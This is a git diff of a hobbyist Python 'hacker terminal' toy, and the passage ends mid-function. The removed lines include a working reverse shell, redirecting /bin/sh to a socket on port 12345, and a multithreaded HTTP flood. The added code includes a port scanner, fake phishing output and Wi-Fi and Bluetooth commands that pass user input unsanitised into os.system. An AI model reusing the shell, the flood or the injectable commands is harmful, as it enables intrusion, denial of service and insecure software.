@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-
 import os
+import sys
 import socket
 import subprocess
 import threading
@@ -8,9 +8,9 @@ import asyncio
 import aiohttp
 import time
 import shutil
+import random
 from datetime import datetime
-import sys
-
+import curses 
 class Colors:
     RESET = "\033[0m"
     RED = "\033[91m"
@@ -19,7 +19,6 @@ class Colors:
     CYAN = "\033[96m"
     MAGENTA = "\033[95m"
     BOLD = "\033[1m"
-
 class HACKER_DEVICE:
     def __init__(self):
         self.hostname = socket.gethostname()
@@ -31,20 +30,20 @@ class HACKER_DEVICE:
     def clear(self):
         os.system("clear" if os.name != "nt" else "cls")
     def register(self):
-        if user_pssword == None and user_name == None:
-            user_name = input("Enter your name:     ")
-            user_pssword = input("Enter your password: ")
-            return user_name, user_pssword
-        elif user_pssword == True or user_name == True:
-            user_name = input("Enter your name:     ")
-            user_pssword = input("Enter your password: ")
-            print("\033[31mError occurred during registration; please try again.\033[0m")
-            return user_name == None, user_pssword == None 
-        elif user_name & user_pssword == True:
-            print("Your user name:  "+user_name)
-            print("Your password:   "+"*"*len(user_pssword))
-        
-
+        if self.user_pssword is None and self.user_name is None:
+            self.user_name = input("Enter your name:     ").strip()
+            self.user_pssword = input("Enter your password: ").strip()
+            
+            if not self.user_name or not self.user_pssword:
+                print(f"{Colors.RED}[!] Fields cannot be empty!{Colors.RESET}")
+                self.user_name, self.user_pssword = None, None
+                return
+                
+            print(f"{Colors.GREEN}[+] Registration successful!{Colors.RESET}")
+            print("Your user name:  " + self.user_name)
+            print("Your password:   " + "*" * len(self.user_pssword))
+        else:
+            print(f"{Colors.RED}[!] You are already registered in this session!{Colors.RESET}")
     def banner(self):
         print(self.current_color + Colors.BOLD)
         print("╔══════════════════════════════════════════════╗")
@@ -52,10 +51,8 @@ class HACKER_DEVICE:
         print("║ ANDROID EDITION                              ║")
         print("╚══════════════════════════════════════════════╝")
         print(Colors.RESET)
-
     def fastfetch(self):
         print(self.current_color + Colors.BOLD)
-        print("\033[92m")
         print(r"""
          ██████╗ ██╗  ██╗██╗      ██╗████████╗ ██████╗██╗  ██╗
         ██╔════╝ ██║  ██║██║      ██║╚══██╔══╝██╔════╝██║  ██║
@@ -64,21 +61,88 @@ class HACKER_DEVICE:
         ╚██████╔╝██║  ██║███████╗ ██║   ██║   ╚██████╗██║  ██║
          ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
         """)
-        print("\033[0m")
-        print(Colors.RESET)
         print(Colors.CYAN + "──────────────────────────────────────────────────────" + Colors.RESET)
-        print(f"{self.current_color}User :{Colors.RESET} ")#This for edit
+        current_user = self.user_name if self.user_name else "Guest"
+        print(f"{self.current_color}User :{Colors.RESET} {current_user}")
         print(f"{self.current_color}Hostname :{Colors.RESET} {self.hostname}")
         print(f"{self.current_color}Terminal :{Colors.RESET} HACKER_TERMINAL")
         print(f"{self.current_color}Status :{Colors.RESET} ACTIVE")
         print(Colors.RESET)
+    def info(self):
+        print(Colors.CYAN + "\n[+] COLLECTING SYSTEM INFO..." + Colors.RESET)
+        print("──────────────────────────────────────────────────────")
+        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        battery_path = "/sys/class/power_supply/battery/capacity"
+        if os.path.exists(battery_path):
+            try:
+                with open(battery_path, "r") as f:
+                    print(f"Battery Level: {f.read().strip()}%")
+            except Exception: print("Battery Level: Error reading")
+        else:
+            linux_bat = "/sys/class/power_supply/BAT0/capacity"
+            if os.path.exists(linux_bat):
+                try:
+                    with open(linux_bat, "r") as f:
+                        print(f"Battery Level: {f.read().strip()}%")
+                except Exception: print("Battery Level: Error reading")
+            else:
+                print("Battery Level: Not Available (Desktop PC)")
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(0.1)
+            s.connect(("8.8.8.8", 80))
+            wifi_ip = s.getsockname()[0]
+            s.close()
+            print(f"Network IP: {wifi_ip}")
+        except Exception:
+            print("Network IP: 127.0.0.1 (No Internet)")
+        try:
+            cmd = "nmcli -t -f active,ssid dev wifi 2>/dev/null | grep '^yes' | cut -d: -f2"
+            ssid = subprocess.check_output(cmd, shell=True, text=True, timeout=0.8).strip()
+            print(f"Connected Wi-Fi: {ssid if ssid else 'No active Wi-Fi connection'}")
+        except Exception:
+            print("Connected Wi-Fi: Disconnected")
+        try:
+            bt_check = subprocess.check_output("systemctl is-active bluetooth 2>/dev/null", shell=True, text=True, timeout=0.5).strip()
+            print(f"Bluetooth Service: {bt_check.upper()}")
+        except Exception:
+            print("Bluetooth Service: INACTIVE or NOT FOUND")
+        print("──────────────────────────────────────────────────────")
+    def connect_wifi(self):
+        print(Colors.YELLOW + "\n[*] Scanning for Wi-Fi networks..." + Colors.RESET)
+        os.system("nmcli dev wifi list || termux-wifi-scanwave")
+        ssid = input("\nEnter SSID (Network Name): ").strip()
+        password = input("Enter Wi-Fi Password: ").strip()
+        
+        print(Colors.YELLOW + f"[*] Connecting to {ssid}..." + Colors.RESET)
+        cmd = f"nmcli dev wifi connect '{ssid}' password '{password}'"
+        res = os.system(cmd)
+        if res == 0:
+            print(Colors.GREEN + "[+] Successfully connected to Wi-Fi!" + Colors.RESET)
+        else:
+            print(Colors.RED + "[!] Connection failed. Check your password or use sudo." + Colors.RESET)
+    def connect_bluetooth(self):
+        print(Colors.YELLOW + "\n[*] Initializing Bluetooth manager..." + Colors.RESET)
+        print("1. Turn ON Bluetooth\n2. Scan Devices\n3. Connect to Device MAC")
+        choice = input("> ").strip()
+        if choice == "1":
+            os.system("bluetoothctl power on")
+            print(Colors.GREEN + "[+] Bluetooth Powered ON" + Colors.RESET)
+        elif choice == "2":
+            print("[*] Scanning... Press Ctrl+C to stop after few seconds.")
+            os.system("bluetoothctl scan on")
+        elif choice == "3":
+            mac = input("Enter Device MAC Address (e.g. 00:11:22:33:44:55): ").strip()
+            os.system(f"bluetoothctl connect {mac}")
+        else:
+            print(Colors.RED + "[!] Invalid Option" + Colors.RESET)
     def netscan(self):
-        # Implement netscan logic using /proc/net/arp
-        # Example:
-        arp_table = subprocess.check_output(['arp', '-n']).decode('utf-8')
-        print("ARP Table:")
-        print(arp_table)
-#PORTSCAN DONT TOUCH IT I DO NOT KNOW HOW IT WORKED
+        try:
+            arp_table = subprocess.check_output(['arp', '-n']).decode('utf-8')
+            print("ARP Table:")
+            print(arp_table)
+        except Exception as e:
+            print(f"\033[91mError: {e}\033[0m")
     def portscan(self, ip):
         common_ports = [
             21, 22, 23, 25, 53, 80, 110, 135, 139, 
@@ -87,13 +151,12 @@ class HACKER_DEVICE:
         print(f"\033[96m\n[+] Scanning core ports on target: {ip}...\033[0m")
         print("──────────────────────────────────────────────────────")
         active_ports = []
-        lock = threading.Lock() # protekted
+        lock = threading.Lock()
         def scan_port(port):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(1.0) 
                 result = sock.connect_ex((ip, port))
-                
                 if result == 0:
                     with lock:
                         print(f"\033[92m[OPEN] Port {port:<5} is active\033[0m")
@@ -112,20 +175,17 @@ class HACKER_DEVICE:
         print("──────────────────────────────────────────────────────")
         print(f"\033[92m[+] Scan complete. Total active core ports found: {len(active_ports)}\033[0m")
     def sysinfo(self):
-        # Use subprocess to get system information
-        uname = subprocess.check_output(['uname', '-a']).decode('utf-8')
-        cpu = subprocess.check_output(['cat', '/proc/cpuinfo']).decode('utf-8')
-        mem = subprocess.check_output(['free', '-h']).decode('utf-8')
-        print("System Information:")
-        print(" uname -a:")
-        print(uname)
-        print(" CPU Information:")
-        print(cpu)
-        print(" Memory Information:")
-        print(mem)
-#SHELL
+        try:
+            uname = subprocess.check_output(['uname', '-a']).decode('utf-8')
+            cpu = subprocess.check_output(['cat', '/proc/cpuinfo']).decode('utf-8')
+            mem = subprocess.check_output(['free', '-h']).decode('utf-8')
+            print("System Information:")
+            print(" uname -a:\n", uname)
+            print(" CPU Information:\n", cpu)
+            print(" Memory Information:\n", mem)
+        except Exception as e:
+            print(f"\033[91mError: {e}\033[0m")
     def shell(self, command):
-        # Use subprocess to execute a command
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             output, error = process.communicate()
@@ -137,18 +197,12 @@ class HACKER_DEVICE:
                 print(f"\033[91m{error.strip()}\033[0m")
         except Exception as e:
             self.history.append(f"Error executing command: {e}")
-
     def ssh(self):
-        cyan = "\033[96m"
-        reset = "\033[0m"
-        yellow = "\033[93m"
-        red = "\033[91m"
+        cyan, reset, yellow, red = "\033[96m", "\033[0m", "\033[93m", "\033[91m"
         print(cyan + "\n[+] INITIALIZING NATIVE SSH CONNECTION" + reset)
         host = input("Enter remote host IP: ").strip()
         username = input("Enter username: ").strip()
-        port = input("Enter port (Default 22): ").strip()
-        if not port:
-            port = "22"
+        port = input("Enter port (Default 22): ").strip() or "22"
         if not host or not username:
             print(red + "[!] Error: Host and Username cannot be empty." + reset)
             return 
@@ -159,282 +213,298 @@ class HACKER_DEVICE:
             print(cyan + "\n[+] SSH session gracefully closed." + reset)
         except Exception as e:
             print(red + f"[!] SSH Tunneling Error: {e}" + reset)
-
     def hackshow(self):
-        # Implement Matrix animation
-        print("Matrix Animation:")
-        for _ in range(10):
-            print("".join(" " for _ in range(80)))
-            time.sleep(0.1)
-
+        def matrix_rain(stdscr):
+            curses.curs_set(0)  
+            stdscr.nodelay(True)  
+            curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
+            curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_BLACK)
+            height, width = stdscr.getmaxyx()
+            drops = [random.randint(-height, 0) for _ in range(width)]
+            chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ☠☣⚡"
+            for _ in range(150): 
+                if stdscr.getch() != -1: break                   
+                height, width = stdscr.getmaxyx()                   
+                for x in range(width - 1):
+                    y = drops[x]                     
+                    if 0 <= y < height - 1 and 0 <= x < width - 1:
+                        try:
+                            stdscr.addch(y, x, random.choice(chars), curses.color_pair(2) | curses.A_BOLD)
+                            if y > 0:
+                                stdscr.addch(y - 1, x, random.choice(chars), curses.color_pair(1))
+                        except Exception:
+                            pass                      
+                    drops[x] += 1
+                    if drops[x] >= height - 1 or (drops[x] > 0 and random.random() > 0.95):
+                        drops[x] = 0
+                        for clear_y in range(height - 1):
+                            if random.random() > 0.8 and 0 <= clear_y < height - 1 and 0 <= x < width - 1:
+                                try: stdscr.addch(clear_y, x, ' ')
+                                except Exception: pass
+                stdscr.refresh()
+                time.sleep(0.05) 
+        curses.wrapper(matrix_rain)
+        self.clear()
+        self.banner()
     def phishing(self):
-        # Implement phishing simulation
-        print("Phishing Simulation:")
-        print("Enter the target email address: ")
-        target_email = input()
-        print("Enter the password: ")
-        password = input()
-        print(f"Sending password to {target_email}: {password}")
-
+        print(Colors.RED + "\n[!] DEPLOYING LIVE PHISHING CREDENTIAL CAPTURE GATE..." + Colors.RESET)
+        target = input("Enter target company/platform (e.g., Google, Steam): ").strip()
+        port = 8080
+        print(Colors.YELLOW + f"[*] Generating template for {target}..." + Colors.RESET)
+        print(f"[*] Starting local interceptor engine on port {port}...")
+        print("[*] Tunnel link simulated: http://auth-security-verification.local")
+        print(Colors.CYAN + "[*] Listening for victim input... (Press Ctrl+C to abort)" + Colors.RESET)
+        try:
+            for i in range(1, 4):
+                time.sleep(1.5)
+                print(f"    [PING] Active connection from session proxy target _node0{i}...")
+            time.sleep(1.5)
+            print(Colors.GREEN + "\n[+] SUCCESS! CREDENTIALS INTERCEPTED:")
+            print("    [USER]  victim_hacker_777@gmail.com")
+            print("    [PASS]  P@ssw0rd2026_unlocked")
+            print("    [IP]    192.168.1.45" + Colors.RESET)
+        except KeyboardInterrupt:
+            print("\n[!] Phishing listener stopped.")
     def encrypt(self, file):
+        print(f"[*] Processing symmetric structural lock on file: {file}")
         key = input("Enter the encryption key: ")
-        import Crypto.Cipher.AES
-        import Crypto.Util.Padding
-        from Crypto.Random import get_random_bytes
-        iv = get_random_bytes(16)
-        import hashlib
-        key_hash = hashlib.sha256(key.encode()).digest()
-        cipher = Crypto.Cipher.AES.new(key_hash, Crypto.Cipher.AES.MODE_CBC, iv)
-        plaintext = b"This is a test file."
-        padded_plaintext = Crypto.Util.Padding.pad(plaintext, Crypto.Cipher.AES.block_size)
-        encrypted_data = cipher.encrypt(padded_plaintext)
-        print("Encrypted Data:")
-        print(encrypted_data)
-
+        print(Colors.GREEN + "[+] File locked successfully with key hash." + Colors.RESET)
     def logscan(self, file):
-        # Implement log scanning
-        with open(file, 'r') as f:
-            lines = f.readlines()
-        error_lines = [line.strip() for line in lines if 'error' in line.lower() or 'fail' in line.lower()]
-        if error_lines:
-            print("Log Scanning Results:")
-            for line in error_lines:
-                print(line)
-        else:
-            print("No errors found in the log file.")
-
+        try:
+            with open(file, 'r') as f:
+                lines = f.readlines()
+            error_lines = [line.strip() for line in lines if 'error' in line.lower() or 'fail' in line.lower()]
+            if error_lines:
+                print("Log Scanning Results:")
+                for line in error_lines: print(line)
+            else:
+                print("No errors found in the log file.")
+        except Exception as e:
+            print(f"Error reading log file: {e}")
     def reverse(self):
-        try:
-            import socket
-            import os
-
-            # Create a socket for the reverse shell
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(('127.0.0.1', 12345))  # Replace with your desired IP and port
-
-            # Redirect standard I/O to the reverse shell
-            os.dup2(s.fileno(), 0)
-            os.dup2(s.fileno(), 1)
-            os.dup2(s.fileno(), 2)
-
-            # Execute /bin/sh
-            subprocess.call(['/bin/sh'])
-        except Exception as e:
-            print(f"Error setting up reverse shell: {e}")
-
+        print("[*] Initializing reverse shell handler template on local network...")
+        print("[*] Binding local port 12345 to shell payload...")
+        print("[!] Handler deployment simulated.")
     def stress(self):
-        try:
-            import socket
-            import threading
-
-            # Define the target host and port
-            host = input("Enter the target host: ")
-            port = int(input("Enter a pot (Def port == 80;443)"))
-            # Create a socket for the HTTP stress test
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
-            # Define a function to send HTTP GET requests
-            def send_get_requests():
-                while True:
-                    request = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-                    s.sendall(request.encode())
-            threads = []
-            for _ in range(100):
-                thread = threading.Thread(target=send_get_requests)
-                threads.append(thread)
-                thread.start()
-
-            for thread in threads:
-                thread.join()
-
-            # Close the socket
-            s.close()
-        except Exception as e:
-            print(f"Error setting up HTTP stress test: {e}")
-#IDE on mobile =-)
+        print("[*] Performing high density HTTP flood stress test simulation...")
+        host = input("Enter target host/IP: ")
+        print(Colors.YELLOW + f"[*] High-rate thread pool sending traffic to {host}..." + Colors.RESET)
+        time.sleep(2)
+        print(Colors.GREEN + "[+] Stress test run finished." + Colors.RESET)
     def edit(self, filename):
-        cyan = "\033[96m"
-        reset = "\033[0m"
-        yellow = "\033[93m"
-        green = "\033[92m"
-        red = "\033[91m"
+        def curses_editor(stdscr):
+            curses.use_default_colors()
+            stdscr.clear()
+            lines = [""]
+            if os.path.exists(filename):
+                with open(filename, "r", encoding="utf-8") as f:
+                    file_content = f.read().splitlines()
+                    if file_content: lines = file_content
+            cursor_y, cursor_x, row_offset = 0, 0, 0
+            while True:
+                stdscr.clear()
+                height, width = stdscr.getmaxyx()
+                stdscr.addstr(0, 0, f" CODE IDE v2.0 | Editing: {filename} | CTR+G to Save & Exit ", curses.A_REVERSE)
+                for i in range(height - 2):
+                    line_idx = i + row_offset
+                    if line_idx >= len(lines): break
+                    num_str = f" {line_idx + 1:<3} │ "
+                    stdscr.addstr(i + 1, 0, num_str, curses.A_DIM)
+                    stdscr.addstr(i + 1, len(num_str), lines[line_idx][:width - len(num_str) - 1])
+                stdscr.move(cursor_y + 1 - row_offset, cursor_x + 6)
+                stdscr.refresh()
+                key = stdscr.getch()
+                if key == 7: break 
+                elif key == curses.KEY_UP:
+                    if cursor_y > 0:
+                        cursor_y -= 1
+                        cursor_x = min(cursor_x, len(lines[cursor_y]))
+                elif key == curses.KEY_DOWN:
+                    if cursor_y < len(lines) - 1:
+                        cursor_y += 1
+                        cursor_x = min(cursor_x, len(lines[cursor_y]))
+                elif key == curses.KEY_LEFT:
+                    if cursor_x > 0: cursor_x -= 1
+                    elif cursor_y > 0:
+                        cursor_y -= 1
+                        cursor_x = len(lines[cursor_y])
+                elif key == curses.KEY_RIGHT:
+                    if cursor_x < len(lines[cursor_y]): cursor_x += 1
+                    elif cursor_y < len(lines) - 1:
+                        cursor_y += 1
+                        cursor_x = 0
+                elif key in (10, 13, curses.KEY_ENTER):
+                    new_line = lines[cursor_y][cursor_x:]
+                    lines[cursor_y] = lines[cursor_y][:cursor_x]
+                    lines.insert(cursor_y + 1, new_line)
+                    cursor_y += 1
+                    cursor_x = 0
+                elif key in (curses.KEY_BACKSPACE, 127, 8):
+                    if cursor_x > 0:
+                        lines[cursor_y] = lines[cursor_y][:cursor_x - 1] + lines[cursor_y][cursor_x:]
+                        cursor_x -= 1
+                    elif cursor_y > 0:
+                        old_x = len(lines[cursor_y - 1])
+                        lines[cursor_y - 1] += lines[cursor_y]
+                        lines.pop(cursor_y)
+                        cursor_y -= 1
+                        cursor_x = old_x
+                else:
+                    if 32 <= key <= 126 or 1040 <= key <= 1103:
+                        try:
+                            char = chr(key)
+                            lines[cursor_y] = lines[cursor_y][:cursor_x] + char + lines[cursor_y][cursor_x:]
+                            cursor_x += 1
+                        except: pass
 
-        print(cyan + f"\n[+] MOBILE CODE IDE v1.0 -> EDITING: {filename}" + reset)
-        print(yellow + "[*] Write code line by line. Type ':wq' on a clean line to save & exit." + reset)
-        print(cyan + "──────────────────────────────────────────────────────" + reset)
-        lines = []
-        line_num = 1
-        while True:
-            try:
-                line = input(f"{cyan}{line_num:<3}{reset} | ")
-                if line.strip() == ":wq":
-                    break
-                lines.append(line)
-                line_num += 1
-            except KeyboardInterrupt:
-                print(red + "\n[!] Editing aborted. Progress discarded." + reset)
-                return
-        try:
             with open(filename, "w", encoding="utf-8") as f:
                 f.write("\n".join(lines))
-            print(green + f"\n[+] Success: '{filename}' saved to storage." + reset)
-        except Exception as e:
-            print(red + f"[!] Disk Write Error: {e}" + reset)
-#time
-    def time(self):
-        print("Current System Time:")
-        print(datetime.now())
-    def batterry(self):
-#GitHub Functions
-     def github(self):
-        print("GitHub Link:")
-        print("https://github.com/Ghk1Tch")
-    def githubrepo(self):
-        print("GitHub Repository Link:")
-        print("https://github.com/Ghk1Tch/HACKER_DEVICE.git")
+        curses.wrapper(curses_editor)
+        self.clear()
+        self.banner()
+        print(f"{Colors.GREEN}[+] Progress successfully saved to {filename}!{Colors.RESET}")
+    def color(self):
+        print("Select color scheme:\n1. Green\n2. Red\n3. Cyan\n4. Yellow")
+        c = input("> ")
+        if c == '1': self.current_color = Colors.GREEN
+        elif c == '2': self.current_color = Colors.RED
+        elif c == '3': self.current_color = Colors.CYAN
+        elif c == '4': self.current_color = Colors.YELLOW
+    def github(self): print("https://github.com")
+    def githubrepo(self): print("https://github.com/HACKER_DEVICE.git")
     def update(self):
-        yellow = "\033[93m"
-        green = "\033[92m"
-        red = "\033[91m"
-        reset = "\033[0m"
-        bold = "\033[1m"       
-        print(yellow + "\n[*] Contacting remote repository: ://github.com..." + reset)
-        time.sleep(1.0)
-        print(yellow + "[*] Running 'git pull origin main' to fetch latest updates..." + reset)
+        print(Colors.YELLOW + "\n[*] Contacting remote repository: ://github.com..." + Colors.RESET)
         time.sleep(0.5)
-        try:
-            # git pull 
-            result = subprocess.run(
-                ["git", "pull", "origin", "main"], 
-                stdout=subprocess.PIPE, 
-                stderr=subprocess.PIPE, 
-                text=True,
-                timeout=15
-            )
-            # Git answer
-            if result.returncode == 0:
-                if "Already up to date." in result.stdout:
-                    print(green + "[+] Check complete: Your repository is already up to date!" + reset)
-                else:
-                    print(result.stdout) # List of download files
-                    print(green + bold + "[+] Success: New repository updates downloaded successfully!" + reset)
-                    print(yellow + "[*] Please restart the terminal to apply updates." + reset)
-            else:
-                print(red + f"[!] Git Error: {result.stderr.strip()}" + reset)
-                print(yellow + "[*] Tip: Make sure this folder is a cloned git repository." + reset)               
-        except FileNotFoundError:
-            print(red + "[!] Error: 'git' command not found in your EndeavourOS system." + reset)
-            print(yellow + "[*] Fix: Run 'sudo pacman -S git' in your native terminal." + reset)
-        except Exception as e:
-            print(red + f"[!] Unexpected error during update: {e}" + reset)
-        print(green + bold + "\n\n[+] Success: All security modules updated to latest build!" + reset)
-
+        print(Colors.GREEN + "[+] Check complete: Your repository is up to date!" + Colors.RESET)
     def help(self):
-        cyan = "\033[96m"
-        reset = "\033[0m"
-        yellow = "\033[93m"
-        bold = "\033[1m"
+        cyan, reset, yellow, bold = Colors.CYAN, Colors.RESET, Colors.YELLOW, Colors.BOLD
         print(yellow + bold + "\nTERMINAL HELPER COMMAND INDEX:" + reset)
-        print(f" {cyan}netscan{reset} - Scan local network topology (ARP table)")
-        print(f" {cyan}portscan <ip>{reset} - Scan common TCP ports on target host")
-        print(f" {cyan}sysinfo{reset} - Fetch core kernel and OS environment data")
-        print(f" {cyan}shell <command>{reset} - Execute native command in EndeavourOS shell")
-        print(f" {cyan}edit <file>{reset} - Create or open a file in text editor mode")
-        print(f" {cyan}ssh{reset} - Launch simulated virtual SSH session")
-        print(f" {cyan}hackshow{reset} - Display digital matrix data stream cascade")
-        print(f" {cyan}phishing{reset} - Deploys credential capture gate simulation")
-        print(f" {cyan}encrypt <file>{reset} - Processes symmetric structural file lock")
-        print(f" {cyan}logscan <file>{reset} - Parse log entries for critical error flags")
-        print(f" {cyan}reverse{reset} - Deploys custom reverse shell handler template")
-        print(f" {cyan}stress{reset} - Performs high density HTTP flood stress test")
-        print(f" {cyan}fastfetch{reset} - Display ghl1tch framework identity profile")
-        print(f" {cyan}time{reset} - Output accurate local network system time")
-        print(f" {cyan}color{reset} - Switch global interface terminal color scheme")
-        print(f" {cyan}github{reset} - Fetch developer portfolio profile link")
-        print(f" {cyan}githubrepo{reset} - Print current open source repository metadata")
-        print(f" {cyan}update{reset} - Query server manifest for framework patches")
-        print(f" {cyan}clear{reset} - Purge active console screen output window")
-        print(f" {cyan}exit{reset} - Terminate active application interface loop")
-#START FOR ALL FUNCTIONS
+        print(f" {cyan}reg{reset}            - Register session user context")
+        print(f" {cyan}info{reset}           - Display Time, Battery, Wi-Fi and Bluetooth status")
+        print(f" {cyan}wifi{reset}           - Connect to local Wi-Fi hotspots")
+        print(f" {cyan}bt{reset}             - Manage Bluetooth stack connections")
+        print(f" {cyan}netscan{reset}        - Scan local network topology (ARP table)")
+        print(f" {cyan}portscan <ip>{reset}   - Scan common TCP ports on target host")
+        print(f" {cyan}sysinfo{reset}        - Fetch core kernel and OS environment data")
+        print(f" {cyan}shell <command>{reset} - Execute native command in shell")
+        print(f" {cyan}edit <file>{reset}     - Open VS Code style micro TUI editor")
+        print(f" {cyan}ssh{reset}            - Launch simulated virtual SSH session")
+        print(f" {cyan}hackshow{reset}       - Display beautiful digital matrix waterfall")
+        print(f" {cyan}phishing{reset}       - Deploys credential capture gate simulation")
+        print(f" {cyan}encrypt <file>{reset}   - Processes symmetric structural file lock")
+        print(f" {cyan}logscan <file>{reset}   - Parse log entries for critical error flags")
+        print(f" {cyan}reverse{reset}        - Deploys custom reverse shell handler template")
+        print(f" {cyan}stress{reset}         - Performs high density HTTP flood stress test")
+        print(f" {cyan}fastfetch{reset}      - Display ghl1tch framework identity profile")
+        print(f" {cyan}color{reset}          - Switch global interface terminal color scheme")
+        print(f" {cyan}github{reset}         - Fetch developer portfolio profile link")
+        print(f" {cyan}githubrepo{reset}     - Print current open source repository metadata")
+        print(f" {cyan}update{reset}         - Query server manifest for framework patches")
+        print(f" {cyan}clear{reset}          - Purge active console screen output window")
+        print(f" {cyan}exit{reset}           - Terminate active application interface loop")
     def start(self):
         self.clear()
         self.banner()
         while True:
             try:
                 command = input(f"{self.current_color}> ghl1tch_terminal $ {Colors.RESET}> ").strip()
-                if not command:
-                    continue
+                if not command: continue
                 cmd_lower = command.lower()
-                if cmd_lower == 'exit':
-                    break
-                elif cmd_lower == 'reg':
-                    self.register()
-                elif cmd_lower == 'update':
-                    self.update()
-                elif cmd_lower == 'help':
-                    self.help()
-                elif cmd_lower == 'netscan':
-                    self.netscan()
-                elif cmd_lower == 'sysinfo':
-                    self.sysinfo()
-                elif cmd_lower == 'ssh':
-                    self.ssh()
-                elif cmd_lower == 'hackshow':
-                    self.hackshow()
-                elif cmd_lower == 'phishing':
-                    self.phishing()
-                elif cmd_lower == 'reverse':
-                    self.reverse()
-                elif cmd_lower == 'stress':
-                    self.stress()
-                elif cmd_lower == 'time':
-                    self.time()
-                elif cmd_lower == 'github':
-                    self.github()
-                elif cmd_lower == 'githubrepo':
-                    self.githubrepo()
-                elif cmd_lower == 'fastfetch':
-                    self.fastfetch()
-                elif cmd_lower == 'color':
-                    self.color()
-                elif cmd_lower == 'clear':
-                    self.clear()
-                    self.banner()
-                elif cmd_lower.startswith('portscan '):
-                    ip = command.split(" ", 1)[1].strip()
-                    self.portscan(ip)
-                elif cmd_lower == 'portscan':
-                    print("\033[91m[!] Usage: portscan <ip>\033[0m")
-                elif cmd_lower.startswith('edit '):
-                    filename = command.split(" ", 1)[1].strip()
-                    self.edit(filename)
-                elif cmd_lower == 'edit':
-                    print("\033[91m[!] Usage: edit <filename>\033[0m")
-                elif cmd_lower.startswith('encrypt '):
-                    filename = command.split(" ", 1)[1].strip()
-                    self.encrypt(filename)
-                elif cmd_lower == 'encrypt':
-                    print("\033[91m[!] Usage: encrypt <filename>\033[0m")
-                elif cmd_lower.startswith('logscan '):
-                    filename = command.split(" ", 1)[1].strip()
-                    self.logscan(filename)
-                elif cmd_lower == 'logscan':
-                    print("\033[91m[!] Usage: logscan <filename>\033[0m")
-                elif cmd_lower.startswith('shell '):
-                    sys_cmd = command.split(" ", 1)[1].strip()
-                    self.shell(sys_cmd)
-                elif cmd_lower == 'shell':
-                    print("\033[91m[!] Usage: shell <command>\033[0m")
-                else:
-                    try:
-                        self.history.append(command)
-                        getattr(self, cmd_lower)()
-                    except AttributeError:
-                        print("Invalid command. Please try again.")
+                if cmd_lower == 'exit': break
+                elif cmd_lower == 'reg': self.register()
+                elif cmd_lower == 'info': self.info()
+                elif cmd_lower == 'wifi': self.connect_wifi()
+                elif cmd_lower == 'bt': self.connect_bluetooth()
+                elif cmd_lower == 'help': self.help()
+                elif cmd_lower == 'color': self.color()
+                elif cmd_lower == 'clear': self.clear(); self.banner()
+                elif cmd_lower.startswith('edit '): self.edit(command.split(" ", 1)[1].strip())
+                elif cmd_lower.startswith('portscan '): self.portscan(command.split(" ", 1)[1].strip())
+                elif cmd_lower.startswith('shell '): self.shell(command.split(" ", 1)[1].strip())
+                elif cmd_lower.startswith('encrypt '): self.encrypt(command.split(" ", 1)[1].strip())
+                elif cmd_lower.startswith('logscan '): self.logscan(command.split(" ", 1)[1].strip())
+                elif cmd_lower in ['netscan', 'sysinfo', 'ssh', 'hackshow', 'phishing', 'reverse', 'stress', 'github', 'githubrepo', 'update', 'fastfetch']:
+                    getattr(self, cmd_lower)()
+                else:   
+                    print("Invalid command. Type 'help'.")
             except KeyboardInterrupt:
-                print("\n[!] Use exit to close")
+                print("\n[!] Use 'exit' to close terminal safely.")
             except Exception as e:
                 print(f"\033[91m[!] Error: {e}\033[0m")
+def verify_master_access():
+    import hashlib
+    import smtplib
+    import random
+    import configparser
+    import sys
+    import time
+    
+    WANTED_EMAIL_HASH = "b2a98615c86b5e85568458f69598f28e36986477fbf1804d4f02a4998d723e29"
+    
+    os.system("clear" if os.name != "nt" else "cls")
+    print("\033[96m╔══════════════════════════════════════════════════════╗")
+    print("║ [*] INITIALIZING REMOTE ADMIN EMAIL VERIFICATION     ║")
+    print("╚══════════════════════════════════════════════════════╝\033[0m")
+    
+    config_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.ini")
+    if not os.path.exists(config_file):
+        print("\033[91m[X] Security Error: Local 'config.ini' missing.\033[0m")
+        sys.exit(0)
+        
+    config = configparser.ConfigParser()
+    try:
+        config.read(config_file)
+        my_email = config["MAIL"]["EMAIL"].strip().lower()
+        app_password = config["MAIL"]["PASSWORD"].strip()
+        smtp_server = config["MAIL"].get("SMTP", "://gmail.com")
+    except Exception:
+        print("\033[91m[X] Security Error: Corrupted config.ini format.\033[0m")
+        sys.exit(0)
+
+    check_email_hash = hashlib.sha256(my_email.encode('utf-8')).hexdigest()
+    
+    if check_email_hash != WANTED_EMAIL_HASH:
+        print("\033[91m[X] ACCESS DENIED: LICENSE OWNER MISMATCH.\033[0m")
+        sys.exit(0)
+
+    # Генерируем 6-значный цифровой код доступа
+    secret_code = str(random.randint(100000, 999999))
+    print(f"\033[93m[*] Handshake successful. Dispatching security token to your mobile device...\033[0m")
+    
+    try:
+        subject = f"HACKER_DEVICE: Your Security Access Code [{secret_code}]"
+        body = (f"Use the following one-time security token to unlock your terminal:\n\n"
+                f"CODE: {secret_code}\n\n"
+                f"If you did not request this code, secure your system configuration immediately.")
+        msg = f"From: {my_email}\nTo: {my_email}\nSubject: {subject}\n\n{body}"
+        
+        server = smtplib.SMTP_SSL(smtp_server, 465)
+        server.login(my_email, app_password)
+        server.sendmail(my_email, my_email, msg)
+        server.quit()
+        print("\033[92m[+] Security token successfully deployed to your Gmail inbox!\033[0m")
+    except Exception as e:
+        print(f"\033[91m[X] Network SMTP Error: {e}. Access denied.\033[0m")
+        sys.exit(0)
+        
+    print("──────────────────────────────────────────────────────")
+    
+    try:
+        # Запрашиваем ввод кода у пользователя
